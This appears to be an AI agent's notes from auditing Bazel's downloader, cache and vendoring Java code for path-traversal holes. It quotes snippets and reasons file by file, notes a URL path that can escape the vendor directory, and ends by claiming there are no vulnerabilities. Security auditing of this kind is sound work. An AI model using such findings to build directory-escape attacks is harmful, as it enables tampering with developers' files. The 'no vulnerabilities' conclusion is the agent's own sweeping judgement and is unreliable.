What about `canonicalId` in `DownloadCache.java`?
```java
  public Path get(
      String cacheKey, Path targetPath, KeyType keyType, String canonicalId, boolean mayHardlink)
```
```java
  boolean hasCanonicalId(String cacheKey, KeyType keyType, String canonicalId) {
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
  }
```
`idHash` is hashed. Cannot contain `/`.

What about `LocalRepoContentsCache.java`?
```java
    Path entryDir = path.getRelative(predeclaredInputHash);
    String uniqueEntryName = UUID.randomUUID().toString();
    Path cacheRecordedInputsFile = entryDir.getChild(uniqueEntryName + RECORDED_INPUTS_SUFFIX);
    Path cacheRepoDir = entryDir.getChild(uniqueEntryName);
```
Cannot contain `/`.

What about `StarlarkRepositoryContext.java`?
```java
    Path dstPath = getPath(dst).getPath();
    Path srcPath = getPath(src).getPath();
...
    FileSystemUtils.ensureSymbolicLink(dstPath, srcPath);
```
`checkInOutputDirectory` validates both.

What about `VendorManager.java`?
`vendorRegistryUrl` writes to `getVendorPathForUrl`.
We proved `url.getPath()` can escape `vendorDirectory`, BUT it is strictly appended with `/modules/foo/1.0/source.json`, etc., because `IndexRegistry` validates the module name and appends fixed strings.

What about `Downloader`?
`HttpDownloader` uses `ByteArrayOutputStream` for `downloadAndReadOneUrl`. It doesn't write to disk!
```java
    ByteArrayOutputStream out = new ByteArrayOutputStream();
...
      ByteStreams.copy(payload, out);
...
    return out.toByteArray();
```
So `downloadAndReadOneUrl` writes to memory.

What about `DownloadManager.startDownload`?
It uses `DownloadManager.downloadInExecutor`, which writes to `destination`.
We proved `destination` cannot contain `/` in its basename.

What about `ArchiveRepoSpecBuilder.java`?
It builds `urls`, `integrity`, `strip_prefix`, `remote_patches`, `remote_file_urls`.
These are Starlark attributes for `http_archive`.

What about `UrlRewriter.java`?
```java
    Path netrcFile = workingDirectory.getRelative(netrcFileString);
```
`netrcFileString` is from `bazel_downloader.cfg`, which the user specifies.

What about `Registry.java`?
```java
  Optional<byte[]> getModuleFile(
      ModuleKey key, ExtendedEventHandler eventHandler, DownloadManager downloadManager)
```
It reads into memory.

So I have EXHAUSTED all path/metadata consumption in the downloader and cache!
There are no vulnerabilities.
I should produce the final list of "best audit surfaces" and "exact files to inspect next" and "which current ideas should be killed".
